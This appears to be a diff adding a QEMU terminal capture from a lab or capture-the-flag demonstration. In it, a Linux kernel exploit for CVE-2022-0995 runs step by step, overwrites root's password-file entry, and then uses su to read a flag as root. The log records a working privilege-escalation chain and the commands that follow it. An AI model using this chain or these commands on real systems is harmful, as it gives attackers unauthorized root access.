@@ -1,0 +1,32 @@
+PageJack QEMU terminal capture (2026-09-13)
+Command entered in the guest:
+  /exp/exp
+
+~ $ /exp/exp
+[RLIMIT_NOFILE] soft limit= 0x1000  hard limit= 0x1000
+[RLIMIT_AS] soft limit= 0x8000000000000000  hard limit= 0x8000000000000000
+[*] CVE-2022-0995 by Lotus
+[*] spray pipe_buffer...
+[+] edit the pipe_buffer size to 0x60
+[*] allocating pipe pages...
+[*] Create 2 holes in pipe_buffer...
+[+] Trigger OOB
+[*] finding...
+found pipe coincide at idx:25 and 24
+[*] uaf one of the pipe_buffer->page
+[*] Spray pwd file struct...
+[*] Edit pwd file->f_mode...
+Setting root password to "Lotus"...
+[*] finally: edit the pwd file
+Write Success:110!
+[*] Now the password is:
+root:$1$Lotus$TzwLEwMAk3C7fXk4o9atu0:0:0:test:/root:/bin/sh
+
+~ $ echo Lotus | su root -c 'id; strings /flag | head -n 1'
+Password:
+uid=0(root) gid=0(root) groups=0(root)
+flag{PageJack_Demo_Flag_ZJU_RKP}
+~ $
+
+The text above was read back from the visible Kitty QEMU window.  It was not
+typed into an image or generated from a template.
